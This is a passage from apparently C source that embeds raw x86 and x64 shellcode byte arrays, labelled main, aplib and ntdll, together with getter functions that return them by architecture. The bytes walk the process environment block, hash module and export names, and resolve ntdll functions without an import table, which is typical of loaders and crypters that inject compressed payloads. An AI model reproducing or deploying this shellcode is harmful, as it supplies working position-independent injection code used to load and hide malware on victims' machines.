  "\x7a\x28\xd1\xee\x85\xf6\x7e\x1e\x0f\xb7\x07\x8d\x7f\x02\x83\xf8\x61\x72\x05\x05\xe0\xff\x00\x00\x69\xc9\x83\x00\x00\x00"
  "\x0f\xb7\xc0\x03\xc8\x4e\x75\xe2\x81\xe1\xff\xff\xff\x7f\x81\xf9\xe6\x9c\xca\x1c\x74\x56\x8b\x12\x85\xd2\x75\xbf\x33\xf6"
  "\x6a\x00\xba\x54\xb8\xb9\x1a\x8b\xce\xe8\x45\x00\x00\x00\x50\xba\x78\x1f\x20\x7f\x89\x03\x8b\xce\xe8\x36\x00\x00\x00\x59"
  "\x59\x8d\x4d\xf8\x89\x43\x04\x51\xc7\x45\xf8\x6e\x74\x64\x6c\x66\xc7\x45\xfc\x6c\x00\xff\xd0\xff\x33\xba\x65\x62\x10\x4b"
  "\x8b\xc8\xe8\x10\x00\x00\x00\x59\x5f\x5e\x89\x43\x08\x5b\x8b\xe5\x5d\xc3\x8b\x72\x10\xeb\xad\x55\x8b\xec\x83\xec\x18\x53"
  "\x56\x8b\x71\x3c\x57\x89\x55\xf4\x8b\x44\x0e\x78\x85\xc0\x74\x6d\x83\x7c\x0e\x7c\x00\x74\x66\x8b\x5c\x08\x18\x89\x5d\xf8"
  "\x85\xdb\x74\x5b\x8b\x54\x08\x1c\x8b\x74\x08\x20\x03\xd1\x8b\x44\x08\x24\x03\xf1\x89\x55\xe8\x03\xc1\x33\xd2\x89\x75\xf0"
  "\x89\x45\xec\x85\xdb\x74\x3a\x8b\x3c\x96\x33\xf6\x03\xf9\x89\x7d\xfc\x8a\x07\x84\xc0\x74\x17\x8b\xdf\x69\xf6\x83\x00\x00"
  "\x00\x0f\xbe\xc0\x03\xf0\x43\x8a\x03\x84\xc0\x75\xee\x8b\x5d\xf8\x81\xe6\xff\xff\xff\x7f\x3b\x75\xf4\x74\x11\x8b\x75\xf0"
  "\x42\x3b\xd3\x72\xc6\x33\xc0\x5f\x5e\x5b\x8b\xe5\x5d\xc3\x83\x7d\x08\x00\x75\x11\x8b\x45\xec\x0f\xb7\x04\x50\x8b\x55\xe8"
  "\x8b\x04\x82\x03\xc1\xeb\xe2\x57\x51\xff\x55\x08\xeb\xdb"
};

char shellcode_ntdll_x64[508] = {
  "\x48\x89\x5c\x24\x08\x48\x89\x6c\x24\x10\x48\x89\x74\x24\x18\x57\x41\x56\x41\x57\x48\x83\xec\x40\x65\x48\x8b\x04\x25\x60"
  "\x00\x00\x00\x41\x8b\xf9\x49\x8b\xe8\x4c\x8b\x48\x18\x44\x8b\xf2\x4c\x8b\xf9\x4d\x8b\x51\x20\xeb\x51\x41\x0f\xb7\x42\x48"
  "\x4d\x8b\x5a\x50\x45\x33\xc9\xd1\xe8\x85\xc0\x7e\x2a\x8b\xc8\x41\x0f\xb7\x03\x4d\x8d\x5b\x02\x66\x83\xf8\x61\x72\x08\xba"
  "\xe0\xff\x00\x00\x66\x03\xc2\x45\x69\xc9\x83\x00\x00\x00\x0f\xb7\xc0\x44\x03\xc8\x48\xff\xc9\x75\xd8\x41\x0f\xba\xf1\x1f"
  "\x41\x81\xf9\xe6\x9c\xca\x1c\x0f\x84\x9a\x00\x00\x00\x4d\x8b\x12\x4d\x85\xd2\x75\xaa\x33\xf6\x45\x33\xc0\xba\x54\xb8\xb9"
  "\x1a\x48\x8b\xce\xe8\x89\x00\x00\x00\xba\x78\x1f\x20\x7f\x48\x8b\xce\x4c\x8b\xc0\x48\x8b\xd8\xe8\x76\x00\x00\x00\x48\x8d"
  "\x4c\x24\x34\xc7\x44\x24\x34\x6e\x74\x64\x6c\x66\xc7\x44\x24\x38\x6c\x00\xff\xd0\x4c\x8b\xc3\x48\x8b\xc8\xba\x65\x62\x10"
  "\x4b\xe8\x50\x00\x00\x00\x48\x8d\x54\x24\x30\xb9\x02\x01\x00\x00\x48\x89\x54\x24\x28\x4d\x8b\xcf\x44\x8b\xc7\x48\x8b\xd5"
  "\x44\x89\x74\x24\x20\xff\xd0\x85\xc0\x78\x06\x39\x7c\x24\x30\x74\x03\x83\xcf\xff\x48\x8b\x5c\x24\x60\x48\x8b\x6c\x24\x68"
  "\x48\x8b\x74\x24\x70\x8b\xc7\x48\x83\xc4\x40\x41\x5f\x41\x5e\x5f\xc3\x49\x8b\x72\x20\xe9\x67\xff\xff\xff\x48\x8b\xc4\x48"
  "\x89\x58\x08\x48\x89\x68\x10\x48\x89\x70\x18\x48\x89\x78\x20\x41\x56\x48\x83\xec\x20\x48\x63\x41\x3c\x4c\x8b\xc9\x49\x8b"
  "\xd8\x8b\x8c\x08\x88\x00\x00\x00\x8b\xea\x85\xc9\x74\x6a\x42\x83\xbc\x08\x8c\x00\x00\x00\x00\x74\x5f\x49\x8d\x04\x09\x44"
  "\x8b\x58\x18\x45\x85\xdb\x74\x52\x44\x8b\x40\x20\x8b\x78\x1c\x8b\x70\x24\x4d\x03\xc1\x49\x03\xf9\x49\x03\xf1\x33\xd2\x45"
  "\x85\xdb\x74\x38\x45\x8b\x10\x4d\x03\xd1\x33\xc9\x41\x8a\x02\x4d\x8b\xf2\xeb\x11\x69\xc9\x83\x00\x00\x00\x0f\xbe\xc0\x03"
  "\xc8\x49\xff\xc6\x41\x8a\x06\x84\xc0\x75\xeb\x0f\xba\xf1\x1f\x3b\xcd\x74\x28\xff\xc2\x49\x83\xc0\x04\x41\x3b\xd3\x72\xc8"
  "\x33\xc0\x48\x8b\x5c\x24\x30\x48\x8b\x6c\x24\x38\x48\x8b\x74\x24\x40\x48\x8b\x7c\x24\x48\x48\x83\xc4\x20\x41\x5e\xc3\x48"
  "\x85\xdb\x75\x0c\x0f\xb7\x0c\x56\x8b\x04\x8f\x49\x03\xc1\xeb\xd4\x49\x8b\xd2\x49\x8b\xc9\xff\xd3\xeb\xca\xcc\xcc"
};

void *get_shellcode_main(int is_x64, int *osize) {
	if (is_x64 == 0) {
		*osize = sizeof(shellcode_main_x86);
		return (void *)shellcode_main_x86;
	}
	*osize = sizeof(shellcode_main_x64);
	return (void *)shellcode_main_x64;
};

void *get_shellcode_aplib(int is_x64, int *osize) {
	if (is_x64 == 0) {
		*osize = sizeof(shellcode_aplib_x86);
		return (void *)shellcode_aplib_x86;
	}
	*osize = sizeof(shellcode_aplib_x64);
	return (void *)shellcode_aplib_x64;
};

void *get_shellcode_ntdll(int is_x64, int *osize) {
	if (is_x64 == 0) {
		*osize = sizeof(shellcode_ntdll_x86);
		return (void *)shellcode_ntdll_x86;
	}
	*osize = sizeof(shellcode_ntdll_x64);
	return (void *)shellcode_ntdll_x64;
};